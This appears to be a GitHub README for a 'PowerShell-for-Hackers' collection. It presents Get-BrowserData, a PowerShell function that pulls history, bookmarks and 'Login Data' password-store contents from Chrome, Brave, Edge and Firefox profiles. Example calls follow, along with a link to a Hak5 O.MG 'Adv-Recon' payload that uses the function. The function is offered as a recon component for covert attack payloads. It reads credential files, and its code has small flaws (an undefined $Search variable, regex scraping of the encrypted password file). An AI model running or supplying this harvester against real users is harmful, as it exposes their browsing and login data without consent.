![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Get-BrowserData

<p align="center">
      <a href="https://youtu.be/2qkgQAwDZgk">
        <img src=https://i.ytimg.com/vi/2qkgQAwDZgk/maxresdefault.jpg width="300" alt="Python" />
      </a>
      <br>YouTube Tutorial	
</p>

## Description

This function can be used to retrieve the browsing history and bookmarks from edge, chrome, and firefox (no bookmarks from firefox currently)

## The Function

### [Get-BrowserData] 

In this function we will pass the browser name and data type (history/bookmarks) as parameter to retrieve the intended data

```
function Get-BrowserData {

    [CmdletBinding()]
    param (	
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,    
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'passwords' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"}  
    elseif ($Browser -eq 'brave'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware/Brave-Browser/User Data/Default/History"}
    elseif ($Browser -eq 'brave'   -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'brave'   -and $DataType -eq 'passwords' )  {$Path = "$env:USERPROFILE/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}
```
SYNTAX:

```
Get-BrowserData -Browser "edge" -DataType "history"

Get-BrowserData -Browser "edge" -DataType "bookmarks"

Get-BrowserData -Browser "chrome" -DataType "history"

Get-BrowserData -Browser "chrome" -DataType "bookmarks"

Get-BrowserData -Browser "chrome" -DataType "passwords"

Get-BrowserData -Browser "brave" -DataType "history"

Get-BrowserData -Browser "brave" -DataType "bookmarks"

Get-BrowserData -Browser "brave" -DataType "passwords"

Get-BrowserData -Browser "firefox" -DataType "history"
```

<p align="right">(<a href="#top">back to top</a>)</p>


## Examples

Listed below are payloads that have used one of these functions:

[Adv-Recon](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ADV-Recon)




<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)

***

[HOME-PAGE](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)

<p align="right">(<a href="#top">back to top</a>)</p>
